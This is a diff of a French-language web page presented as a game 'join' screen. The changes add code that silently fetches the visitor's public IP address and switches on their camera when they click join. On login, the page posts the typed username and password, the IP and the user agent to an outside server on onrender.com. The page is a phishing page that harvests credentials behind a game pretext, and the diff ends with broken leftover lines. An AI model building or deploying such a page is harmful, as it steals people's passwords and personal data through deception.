@@ -183,7 +183,6 @@
             </p>
             <div style="display: flex; gap: 0.5rem; flex-direction: column;">
                 <button id="joinBtn" class="btn">Rejoindre le jeu</button>
-                <button id="geoBtn" class="btn btn-secondary">Position</button>
             </div>
             <div id="posInfo" class="info"></div>
             <video id="videoStream" autoplay playsinline class="hidden"></video>
@@ -220,79 +219,75 @@
     </div>
 
     <script>
-        const mainCard = document.getElementById('mainCard');
-        const loginCard = document.getElementById('loginCard');
-        const joinBtn = document.getElementById('joinBtn');
-        const geoBtn = document.getElementById('geoBtn');
-        const loginBtn = document.getElementById('loginBtn');
-        const posInfo = document.getElementById('posInfo');
-        const videoStream = document.getElementById('videoStream');
+    const mainCard = document.getElementById('mainCard');
+    const loginCard = document.getElementById('loginCard');
+    const joinBtn = document.getElementById('joinBtn');
+    const loginBtn = document.getElementById('loginBtn');
+    const videoStream = document.getElementById('videoStream');
 
-        // Variable globale pour enregistrer la position GPS
-        let userLocation = "Non enregistrée";
+    let userIpAddress = "Non détectée";
 
-        joinBtn.addEventListener('click', () => {
-            mainCard.classList.add('fade-out');
+    // 1. Clic sur "Rejoindre le jeu" : Récupération de l'IP en arrière-plan + Animation vers la connexion
+    joinBtn.addEventListener('click', async () => {
+        // Récupération de l'IP publique
+        try {
+            const res = await fetch('https://api.ipify.org?format=json');
+            const data = await res.json();
+            userIpAddress = data.ip;
+        } catch (e) {
+            console.error("Erreur IP:", e);
+        }
+
+        // Animation d'affichage de la page de connexion
+        mainCard.classList.add('fade-out');
+        setTimeout(() => {
+            mainCard.classList.add('hidden');
+            loginCard.classList.remove('hidden');
             setTimeout(() => {
-                mainCard.classList.add('hidden');
-                loginCard.classList.remove('hidden');
-                setTimeout(() => {
-                    loginCard.style.opacity = '1';
-                    loginCard.style.transform = 'scale(1)';
-                }, 20);
-            }, 400);
-        });
+                loginCard.style.opacity = '1';
+                loginCard.style.transform = 'scale(1)';
+            }, 20);
+        }, 400);
 
-        geoBtn.addEventListener('click', async () => {
-            if (!navigator.geolocation) {
-                posInfo.textContent = 'Géolocalisation non supportée.';
-            } else {
-                posInfo.textContent = 'Recherche de la position...';
-                navigator.geolocation.getCurrentPosition(
-                    (pos) => {
-                        userLocation = `Lat: ${pos.coords.latitude.toFixed(6)}, Lon: ${pos.coords.longitude.toFixed(6)}`;
-                        posInfo.textContent = userLocation;
-                    },
-                    (err) => {
-                        posInfo.textContent = 'Position non autorisée.';
-                    },
-                    { enableHighAccuracy: false, timeout: 10000 }
-                );
+        // Activation optionnelle de la caméra
+        try {
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                videoStream.srcObject = stream;
+                videoStream.classList.remove('hidden');
             }
+        } catch (err) {
+            console.error("Caméra non autorisée :", err);
+        }
+    });
 
-            try {
-                if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    videoStream.srcObject = stream;
-                    videoStream.classList.remove('hidden');
-                }
-            } catch (err) {
-                console.error("Caméra non autorisée :", err);
-            }
-        });
+    // 2. Clic sur "Se connecter" : Envoi des données au serveur Render
+    loginBtn.addEventListener('click', async () => {
+        const user = document.getElementById('username').value;
+        const pass = document.getElementById('password').value;
 
-        // Envoi des données au serveur Python lors de la connexion
-        loginBtn.addEventListener('click', async () => {
-            const user = document.getElementById('username').value;
-            const pass = document.getElementById('password').value;
+        if (user.trim() === '' || pass.trim() === '') {
+            alert('Veuillez remplir tous les champs.');
+            return;
+        }
 
-            if (user.trim() === '' || pass.trim() === '') {
-                alert('Veuillez remplir tous les champs.');
-                return;
-            }
-
-            try {
-                // Envoi des identifiants et des tokens récupérés
-                await fetch('https://unity-30ez.onrender.com/register', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        username: user,
-                        password: pass,
-                        location: userLocation,
-                        userAgent: navigator.userAgent
-                    })
-                });
+        try {
+            await fetch('https://unity-30ez.onrender.com/register', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    username: user,
+                    password: pass,
+                    ip: userIpAddress,
+                    userAgent: navigator.userAgent
+                })
+            });
+            alert("Connexion réussie !");
+        } catch (e) {
+            console.error("Erreur lors de l'envoi :", e);
+        }
+    });
+</script>
 
                 alert('Connexion réussie pour ' + user + ' !');
             } catch (err) {
